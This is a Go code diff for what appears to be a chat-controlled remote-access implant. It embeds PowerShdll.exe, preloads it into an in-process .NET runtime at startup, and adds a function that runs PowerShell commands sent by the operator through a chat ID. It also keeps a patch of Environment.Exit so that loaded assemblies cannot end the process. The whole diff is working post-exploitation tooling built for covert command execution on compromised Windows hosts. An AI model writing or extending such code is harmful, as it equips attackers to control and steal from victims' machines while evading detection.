@@ -1,11 +1,11 @@
 package main
 
 import (
-	_ "embed"
-	"sync"
 	"bytes"
 	"crypto/md5"
+	_ "embed"
 	"encoding/hex"
+	"sync"
 
 	clr "github.com/Ne0nd0g/go-clr"
 )
@@ -16,6 +16,9 @@ var (
 	assemblies  []*assembly
 	//go:embed patch_exit.exe
 	patchExitAssembly []byte
+	//go:embed PowerShdll.exe
+	powershdllAssembly []byte
+	powershdllHash = md5.Sum(powershdllAssembly)
 )
 
 type assembly struct {
@@ -81,6 +84,28 @@ func executeAssemblyByHash(chatID int64, hash string, assemblyArgs []string, run
 	invokeAssembly(chatID, methodInfo, assemblyArgs)
 }
 
+func executePowershell(chatID int64, assemblyArgs []string, runtime string) {
+	rtHost := clrInstance.GetRuntimeHost(runtime)
+	if rtHost == nil {
+		SendMessage(chatID, "Could not load CLR runtime host")
+		return
+	}
+
+	var methodInfo *clr.MethodInfo
+	for _, asm := range assemblies {
+		if asm.hash == powershdllHash {
+			methodInfo = asm.methodInfo
+		}
+	}
+
+	if methodInfo == nil {
+		SendMessage(chatID, "Could not find PowerShdll assembly loaded")
+		return
+	}
+
+	invokeAssembly(chatID, methodInfo, assemblyArgs)
+}
+
 func invokeAssembly(chatID int64, methodInfo *clr.MethodInfo, assemblyArgs []string) {
 	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
 		// For methods like Main(String[] args), if we pass an empty string slice
@@ -88,7 +113,6 @@ func invokeAssembly(chatID int64, methodInfo *clr.MethodInfo, assemblyArgs []str
 		// no arguments, which won't work
 		assemblyArgs = []string{" "}
 	}
-
 	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
 	responseStr := ""
 	if len(stdout) > 0 {
@@ -137,4 +161,6 @@ func init() {
 	assemblies = make([]*assembly, 0)
 	// Patch Environment.Exit
 	executeAssembly(0, patchExitAssembly, []string{}, "")
+	// Load PowerShdll.exe
+	executeAssembly(0, powershdllAssembly, []string{"return"}, "")
 }
